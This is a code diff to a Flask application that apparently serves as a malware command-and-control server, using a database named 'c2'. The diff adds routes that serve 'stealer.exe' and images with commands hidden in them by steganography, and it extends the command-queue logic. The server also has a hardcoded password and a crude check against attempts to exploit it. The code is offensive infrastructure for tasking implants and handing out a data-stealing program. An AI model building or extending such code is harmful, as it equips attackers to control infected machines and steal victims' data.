@@ -1,6 +1,6 @@
 from sqlalchemy import desc, func
 from sqlalchemy.sql.functions import user
-from flask import Flask, render_template, request, url_for, redirect
+from flask import Flask, render_template, request, url_for, redirect, send_file, send_from_directory, safe_join, abort
 # import flask_sqlalchemy
 from flask_sqlalchemy import SQLAlchemy
 from flaskext.mysql import MySQL
@@ -30,6 +30,13 @@ app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".for
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['TEMPLATES_AUTO_RELOAD'] = True
 
+# The absolute path of the directory containing images for users to download
+app.config["CLIENT_ENCODED_IMAGES"] = "/media/sf_c2/encImages/"
+
+# The absolute path of the directory containing CSV files for users to download
+app.config["CLIENT_STEALER"] = "/media/sf_c2/stealer/"
+
+
 
 login_manager = flask_login.LoginManager()
 login_manager.init_app(app)
@@ -38,6 +45,8 @@ login_manager.init_app(app)
 db = SQLAlchemy(app)
 
 password = 'Bobobo'
+
+enc_image_num = 1
 
 
 def main():
@@ -166,6 +175,22 @@ def getImages():
     return images
 
 
+@app.route("/get-image/<image_name>", methods=['GET', 'POST'])
+def get_image(image_name):          
+    try:
+        return send_from_directory(app.config["CLIENT_ENCODED_IMAGES"], path=image_name, as_attachment=True)
+    except FileNotFoundError:
+        abort(404)
+
+
+@app.route("/get-stealer", methods=['GET', 'POST'])
+def get_stealer():          
+    try:
+        return send_from_directory(app.config["CLIENT_STEALER"], path="stealer.exe", as_attachment=True)
+    except FileNotFoundError:
+        abort(404)
+
+
 @app.route('/commands', methods=['GET', 'POST'])
 def getCommand():
     print("---------------------SECRET KEY-------------------")
@@ -190,14 +215,23 @@ def getCommand():
                 print("Result data committed to the db!")
 
             # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
+            
+            # Check if someone is trying to exploit our server
+            try:
+                checker = int(imageNum)
+            except:
+                render_template('redir.html')
 
             task_queue = Command.query.all()
-            image_name = "encImages/" + imageNum + "_diniFall.png"
-            if os.path.exists(image_name):
-                return render_template('commands.html', task_queue=task_queue, image_name=image_name)
+            image_name = imageNum + "_diniFall.png"
+            stealer = False
+            if int(imageNum) == 0:
+                stealer = True
+            if os.path.exists("encImages/" + image_name) or int(imageNum) == 0:
+                return render_template('commands.html', stealer=stealer, image_name=image_name)
             # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
-            return render_template('commands.html', task_queue=task_queue)
+            return render_template('redir.html')
 
     # if something goes wrong
     return render_template('redir.html')
@@ -217,9 +251,12 @@ def create():
 
     cmds = [cmd, cmd2, cmd3]
     pic_num = random.randint(1, 5)
+    print("PIC NUM: ", pic_num)
     img = "images/diniFall" + str(pic_num) + ".png"
-
-    encodeImage(cmds, img, 1)
+    global enc_image_num
+    print("Encoded Image Num: ", enc_image_num)
+    encodeImage(cmds, img, enc_image_num)
+    enc_image_num += 1
     # new_task = Command(cmd=request.form['content'], done=False)
     # db.session.add(new_task)
     # db.session.commit()
